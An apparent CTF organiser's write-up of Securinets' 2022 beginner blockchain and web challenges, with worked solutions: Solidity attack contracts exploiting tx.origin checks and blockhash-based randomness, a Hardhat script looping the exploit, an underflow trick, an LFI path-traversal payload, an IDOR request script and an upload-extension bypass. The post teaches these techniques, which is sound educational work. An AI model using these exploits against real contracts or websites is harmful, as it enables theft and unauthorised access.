---
title: "Securinets friendly CTF 2k22 - Author Writeups"
date: 2022-10-05
cover-image-large: "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664926666/Friendly-ctf/friendly-banner_mbdaso.jpg"
cover-image-small: "https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664926666/Friendly-ctf/friendly-banner_mbdaso.jpg"
tags: [Cybersecurtiy, Writeups, Event, CTF, Securinets,Blockchain,Web]
---

# Blockchain

## 3xplorer

![3xplorer](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924237/Friendly-ctf/explorer_xsz6vl.png)

1. Visit https://goerli.etherscan.io/
2. Put the contract's address
3. > Contract section > Read contract
4. Get the flag `securinets{3xpl0r3_7h3_l4nd5_4nd_f1nd_7h3_37h3r5}`

### #1 Lesson learned

I know how to get informations about a contract by using a block explorer.

## S0lx

![S0lx](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924217/Friendly-ctf/solx_bomnck.png)

1. Read the solidity file

   ```js
       string public immutable X="COntr4cts_";
       function answer() public returns (string memory) {
           S = "S0l1dItY_";
           O = "securinets{";
           L = "ARe_4w3s0m3}";
           return string(abi.encodePacked(O,S, X, L));
   ```

2. We are concatenating a string here using `abi.encodePacked` (encoding bytes basically and packing them together ~ low level string concatination)
3. Get the letters content in the right order -> `securinets{S0l1dItY_COntr4cts_ARe_4w3s0m3}`

### #2 Lesson learned

Solidity is a cool language, but it has its own way of doing things.

## Int3r4ct

![Int3r4ct](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924218/Friendly-ctf/int3ra4ct_holqse.png)

1. Change metamask connection to goerli testnet. [Tutorial](https://blog.cryptostars.is/goerli-g%C3%B6rli-testnet-network-to-metamask-and-receiving-test-ethereum-in-less-than-2-min-de13e6fe5677)

2. Open the developer's console `CTRL+SHIT+I`
3. Logs indicate that `web3js` and `InteractContract` are injected into the console.
4. Now seeing the docs of `web3js` library we see that to call a contract we have to do `contractInstance.methods.methodName().call()` and it returns a promise
   [Web3js Docs Reference](https://web3js.readthedocs.io/en/v1.2.11/web3-eth-contract.html#methods-mymethod-call)
5. Execute it, we should add `await` because it returns a promise. `await InteractContract.methods.FLAG().call()`
6. Enjoy the flag `securinets{Y0u_Int3r4ct3d_With_The_Contr4ct_Usin6_The_Web3j_L1br4ry}`

### #3 Lesson Learned

There are librairies with which you can craft payloads and different scripts. They can make your life a lot easier !

## Gr33dyR0b0t

![Greedy Robot](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924235/Friendly-ctf/greedy-robots-ch_rnd2ve.png)

1. Change metamask connection to goerli testnet. [Tutorial](https://blog.cryptostars.is/goerli-g%C3%B6rli-testnet-network-to-metamask-and-receiving-test-ethereum-in-less-than-2-min-de13e6fe5677)
2. Do some web enumeration, you will find the robot address in a html comment
   > DEV NOTE: Hook contract to dapp 0x79089d5B521030852EdEEeF47A3cD726F3d59e7b

![Send Ethers with metamask](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924238/Friendly-ctf/send-ethers-metamask_ymvjpv.png)

3. Send ethers to the robot and get the flag `securinets{p0intless_g3n3ros1tY}`

### #4 Lesson learned

Sending money in the blockchain is so easy. But that what makes it a source of danger.

## No Man's Land

![No Man's Land](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924234/Friendly-ctf/No-man-land_edtogs.png)

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract NoManLand {
    mapping(address => bool) flagHolders;

    event WonFlag(address indexed);

    function sendFlag() public returns (bool) {
        require(
            tx.origin != msg.sender,
            "Hey you are not getting the point here"
        );
        flagHolders[tx.origin] = true;
        emit WonFlag(tx.origin);
        return true;
    }

    function canGetFlag(address playerAddress) public view returns (bool) {

        return flagHolders[playerAddress];
    }
}
```

1. We can notice the `require()`, it reverts the transaction when `tx.origin!=msg.sender`

So let's understand what's `tx.origin` and `msg.sender`:

- `tx.origin` is the address that started the transactions.( Called a function of a contract which calls the function from another contract client -> contract -> contract falls all under one transaction. The client here is the `tx.origin`.
- `msg.sender` is the direct address of the one that is calling the function. So if we got contract1 -> contract2 -> contract3 where `->` is a function call. The contract3 will have as `msg.sender` value the address of the contract2 and `contract2` will have as `msg.sender` value the address of contract1.

[Consensys Tx.origin](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/tx-origin/)

2. So let's craft a contract that works as an intermediate to calling the `sendFlag` function.

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface NoManLand{
      function sendFlag() public returns (bool) ;
}

contract Solver {
    NoManLand public victimContract;


    constructor(address victimAddress){
        victimContract=NoManLand(victimAddress);
    }

    function getFlag() public returns (bool){
        victimContract.sendFlag();
        return victimContract.canGetFlag(tx.origin);
    }
}
```

We can use [Remix IDE](https://remix.ethereum.org/), to deploy the contract. 4. We execute the `getFlag` 3. After the transaction succeeds,We go to the website and verify.
`securinets{F4ck_Hnm4ns_Sm4rt_C0n5racts_R0kx}`

### #5 Lesson learned

- `tx.origin` is a bad way to identify the other party.

## EndGame

![End game](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924238/Friendly-ctf/endgame_cfigxc.png)

1. Reading the logic of the contract we find one interesting function:

```js
    function climbLeaderboard(uint256 tryhardCoeff, address realPlayerAddress)
            public
        {
            // If you have a flag why do you have to call it again (just to not add useless events. I need to keep track of solves )
            require(!flagHolders[msg.sender]);
            require(players[realPlayerAddress], "You are not a player");
            require(
                playersHealth[realPlayerAddress] - 100 * tryhardCoeff > 0,
                "Player is dead"
            );

            playersHealth[realPlayerAddress] -= 200 * tryhardCoeff;
            playersPoints[realPlayerAddress] += 100;

            if (playersPoints[realPlayerAddress] > 1000) {
                emit WonFlag(tx.origin);
                flagHolders[msg.sender]=true;
            }
        }
```

2. If we follow the contract's logic. We will lose the game certainly as our health will deplete faster than the points we gain. Okay so we have `playersHealth[realPlayerAddress] -= 200 * tryhardCoeff;`. It's subtracting a positive value from `uint` and has a coefficient that we control. That makes it vulnerable both logically by throwing zero to it and for the expert eyes to underflow. That means when when the result value of the operation <0, it will underflow to take the maximum value which is in our case 2^265. A good article to better understand what I am talking about [Underflow and overflow article](https://hackernoon.com/hack-solidity-integer-overflow-and-underflow). I didn't want to force a solution as most are beginners and not familiar with the solidity language ^^.
3. Okay so we have just to pass a value for the coefficient that is `>=11` to cause the underflow then we spam the `climbLeaderboard` till we get an error.
4. Here is a smart contract to do it.

> PS: The vulnerability is patched since the 0.5.0 [Github issue](https://github.com/ethereum/solidity/issues/796) > `securinets{0d0m3t3r_4r3_Th3_G0ds_0f_0verfl000w}`

### #7 Lesson learned

Solidity is not the perfect language.

## Crazy Gambler

![Crazy gambler](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924214/Friendly-ctf/crazy-gambler_hxbelt.png)

This task is really a challenging one. I was hesitant at first for adding it as I had simpler ones. It's the only task that forces you to write a script in web3 library. However I was surprised when a participant told me he did manually ! That's a lot of perseverance and dedication, It's truly amazing.

1. Read the contract

```js
 function _rollDice() internal view returns (uint256) {
        uint256 blockNo = block.number - 1;
        uint256 diceRes = uint256(blockhash(blockNo)) % 3;
        return diceRes;
    }

    function trialCredit() public {
        require(!gotTrial[msg.sender], "You already got your trial credits");
        gamblersCredit[msg.sender] += 7;
    }

    function gamble(address ownerAddress) public {
        // Fuck off, No need to emit event again.
        require(!flagHolders[ownerAddress]);
        uint256 roll = _rollDice();

        if (roll == 0) {
            gamblersCredit[msg.sender] += 1;
        } else {
            gamblersCredit[msg.sender] = 0;
        }

        // We get flag when we reach 20 !
        if (gamblersCredit[msg.sender] ==20) {
            flagHolders[ownerAddress] = true;

            // Good bye gambler :)
            gamblersCredit[msg.sender] = 0;
            emit WonFlag(ownerAddress);
        }
    }
```

So we are trying to mimicate randomness by using the `block number`. Okay so if you don't what are blocks in the blockchain. I really recommend [Jargon Reference](https://www.upgrad.com/blog/blockchain-architecture/). Why I said mimicate ? Well, because block number is something anyone has access to. So predicting the value is really easy.

Let's craft an evil contract that will implement `_rollDice` and call the gamble if we get the `0` value.

> I copied and pasted the CrazyGambler contract's code from the etherscan interface.

One other interesting thing:

```js
function trialCredit() public {
        require(!gotTrial[msg.sender], "You already got your trial credits");
        gamblersCredit[msg.sender] += 7;
    }

```

Here I am doing the check if the user got a trial or not but I am not modifying that value anywhere. So the user can get infinite `trialCredit`.
We can use that to get close to our target value of credits which is `20`.
Also, it allows the player to reuse its address.

Let's craft our evil contract then..

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "./CrazyGambler.sol";

contract ExploitContract {
    CrazyGambler crazyGambler;

    constructor(address victimAddress) {
        // Setting our target
        crazyGambler = CrazyGambler(victimAddress);
    }

    event Gamble(uint256);

    // Using the same function
    function _rollDice() internal view returns (uint256) {

        uint256 blockNo = block.number - 1;
        uint256 diceRes = uint256(blockhash(blockNo)) % 3;
        return diceRes;
    }

    //
    function initThing() public {
        crazyGambler.trialCredit();
        crazyGambler.trialCredit();
    }

    function tryToSolve() public  {
        uint256 res = _rollDice();
        // The same check as in gamble
        if (res == 0) {
            crazyGambler.gamble(msg.sender);
        }
        // Here to keep track of our progress
        uint256 currentCredit = crazyGambler.gamblersCredit(address(this));
        // Emitting an event is like announcing something. It's really good
        // to inform off-chain parties of on-chain updates
        emit Gamble(currentCredit);
    }
}
```

I used both `hardhat` and `foundry` for scripting the exploit. We need to call the function tryToSolve till we get to 20.
, but I will share the `hardhat` one because it's easier to understand as it's javascript code. ( well I write in Typescript. Can't live without type safety )

```js
import { ethers, getNamedAccounts } from "hardhat";
import { CrazyGambler, ExploitContract } from "../typechain-types";

let crazyGambler: CrazyGambler;
let exploitContract: ExploitContract;
let deployer: string;


const setUp = async () => {
    // Getting my private key
    deployer = (await getNamedAccounts()).deployer;

    // Getting the crazy gambler's address
    const crazyGamblerAddress = "0x55409Be51f453acCDbab41c439545FA317C0508b"

    // Uncomment to use for deploy a contract and start the exploit
    crazyGambler = await ethers.getContractAt("CrazyGambler", crazyGamblerAddress);
    // Deploying my exploit contract
    const exploitContractFactory = await ethers.getContractFactory("ExploitContract");
    const tx = await exploitContractFactory.deploy(crazyGamblerAddress)
    exploitContract = await tx.deployed();

    //  Comment that to reuse the contract, (might crash because a transaction fail or hit the rate limit on the Infura Node )
    // exploitContract = await ethers.getContractAt("ExploitContract", "0x2CAa717BaA85A0B5B39798bDB9121243D84Fe2E3");
    console.log('deployed exploit contract', exploitContract.address)

}


const solve = async () => {
    let solved = false;

    // Uncomment that when you are using the contract for the first time
    await (await exploitContract.initThing({ gasLimit: 300000 })).wait(1)

    // Keeping track of the balance
    let currentBalance = (await crazyGambler.gamblersCredit(exploitContract.address)).toNumber();

    console.log('current balance', currentBalance)

    while (!solved) {
        try {
            const res = await (await exploitContract.tryToSolve({ gasLimit: 300000 })).wait()
            console.log((res as any)?.events[0]?.args[0].toNumber())
        }
        catch (error: any) {
            console.log(error.message)

        }

        // Updating balance
        currentBalance = (await crazyGambler.gamblersCredit(deployer)).toNumber();
        console.log('current balance', currentBalance)
        // So the script don't overrun
        if (currentBalance >= 20) break;


        // Algorithm foo
        solved = await crazyGambler.canGetFlag(deployer, { gasLimit: 30000 });
        console.log("Yes it's solved")

    }
}

async function main() {
    await setUp();
    await solve();
}

main().then(() => console.log('finished')).catch(error => {
    console.log(error)
})

```

`securinets{G4mbl1ng_Th3_Bl0ck_1s_A_MyTh}`

> Kudos to one participant, who did execute the script manually. It's really hard to do so. 30% chance to get a good hash ( Not really but we can say so) and with
> a block time of 15 seconds. The script should run for some time. Mine did solve it in 30 minute while. I know it's not the best way to present such a task. But that's the closest to how hacks happen on the mainnet. They needs patience.

![Picture of participant conversation](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664925884/Friendly-ctf/odd_elq1gd.png)

### Lesson Learned

- Randomness is impossible to perform in the blockchain world without the help of off-chain solutions. Oracles are made for that. But wait how trustful are they ?

## There is more than the eye can see

### Greedy Robot: the mean solution `mean for the robot ofc :)`

Okay so here is the trick, there are two intended solutions to this task each one gives different insight.

Most people stopped the enumeration and went to search how they can send ethers on the blockchain even that the price is high ( half what the alchemy - most generous faucet) gives you.

That's the basic challenge, but I wanted to raise the concern that in the dapps world there is huge immaturity from the developers in their approach of integrating blockchain with old technologies ( web tech in this situation ). If you check the contract's source code by using the `etherscan`.

```js
function canPass(address contributorAddress) public view returns (bool) {
        return contributors[contributorAddress] >= MINIMUM_CONTRIBUTION;
    }
```

Okay so it's passing the address and checking if it has sent ethers or not. Seeing the client of the dapp, It's sending the address

![Request](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924237/Friendly-ctf/vulnerable-request_cdtawm.png)

So, the server is actually checking if the user sent the ethers or not by calling the canPass from the contract. Wait, there is no mechanism to ensure that it's the same user who sent the ethers is using the dapp right now.

I even sent ethers myself to the contract so anyone can grab my address and send it to the api to get the flag :)

![Other](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924238/Friendly-ctf/greedy-robots-tx-logs_mnv9z5.png)

```bash
curl  https://greedy-robots.ctf.securinets.tn/api/flag --json '{{"address":"0x84e7a3679A82C2766Ff8382862ab883FF9460307"}}
```

![Evil R0b0t](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924235/Friendly-ctf/evil-robot_ic0ajq.png)

Now you get the challenge name `securinets{p0intless_g3n3ros1tY}`

### #8 Lesson learned

The weakest link in blockchain is its integration with current technologies. Never forget the old arts !

# Web

## Cr4zy-Js0n

![Cr4zy-Js0n](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924233/Friendly-ctf/crazy-json_xbuh1l.png)

I really want to apologize for the confusion this task has created. I wanted to expose the beginner to JSON which is a data format commonly used in web application nowadays. Didn't mean to create confusion on getting answers to the gates. I wanted it to be a fun task :/ .

- **Solution**

```bash
curl URL -X POST --json '{"answers":[{"Gate One":"Man"},{"Gate Two":true},{"Gate Three":12}]}'
```

`securinets{w3b_5p34k5_j50n_It_S4fe?}`

## Agent-007

![Agent-007](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924233/Friendly-ctf/agent-007_k9g2vn.png)

- **Solution**

User-agent header to identify user's browser. Used to identify secret agents.

```bash
`curl URL -H "User-Agent: James Bond"`
```

## L0ki-Was-L0st

![L0ki-Was-L0st](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924213/Friendly-ctf/l0ki-w4s-l0st_ynzmxn.png)

> I didn't watch the movie/serie It's totally inspired for my interest for Nordic/Pagan Mythology :P

Simple LFI vulnerability on `page` url paramater. get the flag by visiting `URL?page=../../../flag.txt`.

`securinets{L00k_4_LF1_N0T_F0R_L0K1}`

## F00ly-F4ct0ry

![F00ly-F4ct0ry](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924232/Friendly-ctf/fooly-f4ctory_hv3dwq.png)

- [IDOR ressource](https://portswigger.net/web-security/access-control/idor)

```py
import requests
import os

URL='URL_HERE'


session = requests.Session()
with requests.Session() as s:
    login_resp= s.post(URL+'/login',data={"username":"test2","password":"test2"})
    mecha_resp= s.get(URL+'/mecha/1')

    start_flag_index=mecha_resp.text.index('securinets')
    end_flag_index=mecha_resp.text.index('}')
    print(mecha_resp.text[start_flag_index:end_flag_index+1])
```

`securinets{F00LY_ID0R_Is_C00L}`

## F4ke-Upl04d

Here we will apply the basic upload filter bypass technique which is changing the file extension.

In the website, it asks only for png/pdf. So how about we modify a `document.pdf` to `document.pdf.png` ?
It's checking for file extension only so by sending a faked file extension it gives you the flag !

`securinets{4lw4y5_ch3ck_m461c_numb3r5}`

## After words

I am glad to see you all enjoyed our CTF and learned new things. That's the first time I write in a CTF and I loved seeing people enjoying the CTF and some of my task (definitely not Cr4zy-Js0n). In Securinets INSAT, We are going soon to have workshops where beginners who want to advance will have the opportunity to.
